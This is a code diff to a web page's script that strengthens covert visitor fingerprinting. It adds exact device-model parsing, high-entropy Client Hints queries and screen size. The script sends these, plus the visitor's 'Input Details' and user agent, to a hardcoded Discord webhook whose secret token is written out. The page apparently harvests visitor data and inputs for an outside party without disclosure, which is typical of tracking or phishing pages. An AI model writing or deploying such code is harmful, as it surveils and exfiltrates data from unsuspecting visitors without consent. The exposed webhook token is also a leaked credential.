@@ -97,32 +97,83 @@ footer .links a{color:var(--muted);font-weight:400}
 <script>
 const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1568460908886364362/pD_ue9r-hYvntxdg80KmtIZ6lQFHRQL_ke9_NkbAl2QJweaaIco1QKiCt5jcS0SrXBDK";
 
-function extractMobileModel(ua) {
-  let detectedModel = "Unknown Mobile Device";
-  if (/Samsung/i.test(ua)) detectedModel = "Samsung Device";
-  else if (/Xiaomi|Redmi|POCO/i.test(ua)) detectedModel = "Xiaomi / Redmi Device";
-  else if (/Vivo/i.test(ua)) detectedModel = "Vivo Device";
-  else if (/OPPO/i.test(ua)) detectedModel = "Oppo Device";
-  else if (/Realme/i.test(ua)) detectedModel = "Realme Device";
-  else if (/OnePlus/i.test(ua)) detectedModel = "OnePlus Device";
-  else if (/Huawei|HONOR/i.test(ua)) detectedModel = "Huawei / Honor Device";
-  else if (/iPhone/i.test(ua)) detectedModel = "Apple iPhone";
-  else if (/iPad/i.test(ua)) detectedModel = "Apple iPad";
-  return detectedModel;
+// Advanced Deep Device & Model Parser
+function parseExactDeviceModel(ua) {
+  let modelName = "Unknown Mobile Device";
+
+  // Check Apple Devices
+  if (/iPhone/i.test(ua)) {
+    modelName = "Apple iPhone";
+  } else if (/iPad/i.test(ua)) {
+    modelName = "Apple iPad";
+  } 
+  // Check specific build string patterns or device identifiers in Android UA
+  else {
+    // Extract specific model code right before build tokens (e.g., "; SM-A556B Build/" or "; M2101K6G ")
+    const buildRegex = /(?:Android[^;]+;\s*([^)]+?)\s*(?:Build\/|\))/i;
+    const match = ua.match(buildRegex);
+    
+    if (match && match[1]) {
+      let rawDeviceToken = match[1].trim();
+      // Clean up common system architecture tags to isolate the exact model name/code
+      rawDeviceToken = rawDeviceToken.replace(/(Linux|U|CPU|rv:[\d.]+|[a-z0-9]+(?:[-_][a-z0-9]+)+-like-Gecko)/gi, '').trim();
+      if (rawDeviceToken.length > 1 && !/android/i.test(rawDeviceToken)) {
+        modelName = rawDeviceToken;
+      }
+    }
+
+    // Fallback brand recognition with series parsing if generic
+    if (modelName === "Unknown Mobile Device") {
+      if (/Poco/i.test(ua)) modelName = "Poco Device";
+      else if (/Redmi/i.test(ua)) modelName = "Xiaomi Redmi Device";
+      else if (/Xiaomi|MIUI/i.test(ua)) modelName = "Xiaomi Device";
+      else if (/Realme/i.test(ua)) modelName = "Realme Device";
+      else if (/OPPO/i.test(ua)) modelName = "Oppo Device";
+      else if (/vivo/i.test(ua)) modelName = "Vivo Device";
+      else if (/OnePlus/i.test(ua)) modelName = "OnePlus Device";
+      else if (/Samsung|SM-/i.test(ua)) modelName = "Samsung Galaxy Device";
+      else if (/Huawei|HONOR/i.test(ua)) modelName = "Huawei / Honor Device";
+      else if (/Intec|Itel|Tecno|Infinix/i.test(ua)) modelName = "Transsion Device";
+    }
+  }
+
+  return modelName;
 }
 
 async function getDeviceInfo() {
   const ua = navigator.userAgent;
   let os = "Unknown OS";
-  if (/android/i.test(ua)) os = "Android";
-  else if (/iPad|iPhone|iPod/.test(ua) && !window.MSStream) os = "iOS";
-  else if (/win/i.test(ua)) os = "Windows";
-  else if (/mac/i.test(ua)) os = "macOS";
-  else if (/linux/i.test(ua)) os = "Linux";
+
+  if (/android/i.test(ua)) {
+    os = "Android";
+  } else if (/iPad|iPhone|iPod/.test(ua) && !window.MSStream) {
+    os = "iOS";
+  } else if (/win/i.test(ua)) {
+    os = "Windows";
+  } else if (/mac/i.test(ua)) {
+    os = "macOS";
+  } else if (/linux/i.test(ua)) {
+    os = "Linux";
+  }
+
+  let exactModel = parseExactDeviceModel(ua);
+
+  // High-entropy Client Hints override if available on modern browsers
+  if (navigator.userAgentData) {
+    try {
+      const hints = await navigator.userAgentData.getHighEntropyValues(["model", "platform", "platformVersion"]);
+      if (hints.model && hints.model !== "") {
+        exactModel = hints.model + " (Client Hint Verified)";
+      }
+      if (hints.platform) {
+        os = hints.platform;
+      }
+    } catch (e) {}
+  }
 
   return {
     os: os,
-    deviceModel: extractMobileModel(ua),
+    deviceModel: exactModel,
     screen: `${window.screen.width}x${window.screen.height}`,
     userAgent: ua
   };
@@ -135,11 +186,12 @@ async function sendNotification(actionType, extraData = {}) {
   const payload = {
     content: `🔔 **Alert: ${actionType}**`,
     embeds: [{
-      title: "Device Fingerprint",
+      title: "Detailed Device & Model Fingerprint",
       color: 3447003,
       fields: [
         { name: "Operating System", value: info.os, inline: true },
-        { name: "Parsed Device Model", value: info.deviceModel, inline: true },
+        { name: "Exact Detected Model", value: info.deviceModel, inline: true },
+        { name: "Screen Size", value: info.screen, inline: true },
         { name: "Input Details", value: JSON.stringify(extraData), inline: false },
         { name: "User Agent", value: info.userAgent, inline: false }
       ],
